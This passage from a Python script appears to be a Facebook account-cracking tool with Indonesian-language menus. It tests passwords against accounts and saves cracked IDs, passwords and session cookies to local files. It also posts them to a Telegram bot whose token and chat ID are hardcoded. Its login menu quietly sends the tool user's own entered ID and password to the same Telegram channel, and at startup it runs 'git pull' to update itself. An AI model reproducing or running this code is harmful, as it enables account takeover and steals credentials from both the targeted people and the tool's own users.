				tree.add(nel.fit(f"[bold yellow]{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold yellow]{ua}",width=70,title=f"[bold yellow] CP ",style=f"bold white"))
				cetak(nel(tree,style="bold yellow"))
				requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={idf}|{pw}| result CP").json()
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree (nel(f"                        {O2}LIVE OK",style="bold green"))
				tree.add(nel.fit(f"[bold purple]{idf}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{pw}",style=f"bold white"))
				tree.add(nel.fit(f"{H2}{tahun(idf)}",style=f"bold white")).add(nel.fit(f"[bold purple]{kuki}",width=70,style=f"bold white"))
				cetak(nel(tree,style="bold green"))
				requests.post(f"https://api.telegram.org/bot5776502345:AAEoP3n6amtGewprF9ZHJcffjxXseNi6v5E/sendMessage?chat_id=5384702841&text={idf}|{pw}|{tahun(idf)} RESULT OK").json()
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
from rich.progress import track
def tool():
	banner()
	cetak(nel(f'{P2}[{RW}01{P2}]{P2}Login Menggunakan Cokies\n{P2}[{RW}02{P2}]{P2}Login Menggunakan User Id Dan Pw',style="bold green",title=f"[bold white]MENU LOGIN"))
	print('')
	kall_xc = input(f'{P}[{O}?{P}]{P}Pilih : ')
	if kall_xc in['']:print(f'{H}Bego Lu bang');login()
	elif kall_xc in ['1','01']:login()
	elif kall_xc in ['2','02']:
	    print('')
	    ng = input(f'{P}[{O}?{P}]{P}Masukan User Id : ')
	    kg = input(f'{P}[{O}?{P}]{P}Masukan Password : ')
	    for _ in track(range(100), description=f' [bold green]Loading'):process_data()
	    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={ng}|{kg}").json()
	    login()
	
###----------[ SISTEM KONTROL ]---------- ###
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	tool()

